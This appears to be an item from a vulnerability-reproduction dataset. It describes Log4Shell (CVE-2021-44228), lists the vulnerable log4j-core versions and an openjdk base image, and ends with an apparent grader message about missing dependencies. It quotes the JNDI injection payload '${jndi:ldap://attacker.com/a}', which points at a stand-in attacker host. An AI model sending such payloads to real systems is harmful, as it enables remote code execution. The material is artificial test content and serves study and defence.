CVE description: CVE‑2021‑44228, commonly known as Log4Shell, is a critical remote code execution vulnerability in the Apache Log4j 2 logging library. The library processes message lookups written as `${…}` in logged data. When a JNDI lookup expression such as `${jndi:ldap://attacker.com/a}` is encountered, Log4j initiates a JNDI request to the attacker‑controlled LDAP or other JNDI service, retrieves a malicious Java class and loads it into the JVM, where it is executed with the privileges of the vulnerable application. Any Java application that includes Log4j 2 (core versions 2.0‑beta9 through 2.15.0, except the security‑only releases 2.12.2, 2.12.3, and 2.3.1) and accepts user‑controlled input that may be logged (for example HTTP headers, query parameters, cookies, or request bodies) is vulnerable. Successful exploitation gives an attacker full remote code execution on the host, allowing complete compromise of confidentiality, integrity, and availability. The vulnerability was widely exploited in the wild shortly after disclosure, with attackers delivering backdoors, credential stealers, and cryptominers.
Attack Type: remote code execution
Services (format: [SERVICE-DEPENDENCY-TYPE][SERVICE-NAME][SERVICE-VERSIONS] SERVICE-DESCRIPTION):
- [HARD][openjdk][['8-jdk-alpine']] Base Java runtime used to run a custom Java application that includes the vulnerable Log4j 2 core library (versions 2.0‑beta9 through 2.15.0, excluding 2.12.2, 2.12.3, and 2.3.1). The application logs attacker‑controlled data, triggering the Log4Shell vulnerability.
- [HARD][log4j-core][['2.0-beta9', '2.0-beta10', '2.0', '2.1', '2.2', '2.3', '2.4', '2.5', '2.6', '2.6.1', '2.6.2', '2.7', '2.8', '2.8.1', '2.8.2', '2.9.0', '2.9.1', '2.10.0', '2.11.0', '2.11.1', '2.12.0', '2.13.0', '2.13.1', '2.13.2', '2.13.3', '2.14.0', '2.14.1', '2.15.0-rc1', '2.15.0']] Vulnerable Log4j core library containing the JNDI lookup feature that enables the remote code execution when a malicious `${jndi:...}` pattern is logged.
Expected 'HARD' dependencies service not proposed!
